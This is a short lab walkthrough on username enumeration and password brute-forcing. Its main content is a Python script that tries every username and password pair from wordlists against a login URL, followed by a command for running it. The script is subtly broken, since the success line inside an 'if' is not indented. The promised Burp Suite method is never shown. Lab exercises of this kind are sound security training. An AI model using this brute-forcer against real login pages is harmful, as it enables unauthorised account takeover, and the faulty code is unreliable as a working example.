
This lab is vulnerable to username enumeration and password brute-force attacks.  
It contains an account with predictable credentials that can be discovered using the provided wordlists:  
**Candidate usernames** and **Candidate passwords**.

There are two ways to solve this lab: by writing a Python script or by using Burp Suite. In this walkthrough, we will demonstrate both approaches.

python script :
```python
import requests as req

import argparse
parser = argparse.ArgumentParser(description="Brute force login")
parser.add_argument("url", help="Login URL")
parser.add_argument("-p", "--passwords", required=True, help="Password list")
parser.add_argument("-u", "--users", required=True, help="User list")
args = parser.parse_args()

url = args.url

filePassword = args.passwords

fileUser = args.users

cookies = {
"session": "RobiHn1FaNWNpih0poqGDunplOYNLwsW"
}
print(f"[+] Target: {url}")

with open(fileUser, "r") as users, open(filePassword, "r") as passwords:

	for username in users:
		username = username.strip()
		for password in passwords:
			password = password.strip()
			data = {
			
			"username": username,
			
			"password": password
			
			}
			response = req.post(url, cookies=cookies, data=data)
			print(f"Trying {username}:{password} -> {response.status_code}")
			if "Invalid" not in response.text and "Incorrect" not in response.text:
			print(f"[SUCCESS] {username}:{password}")
			exit()
		passwords.seek(0)
```

how to use :

```bash
$ python3 login_brute-force.py https://URL/login -p ./listPass.txt -u ./listUser.txt
```

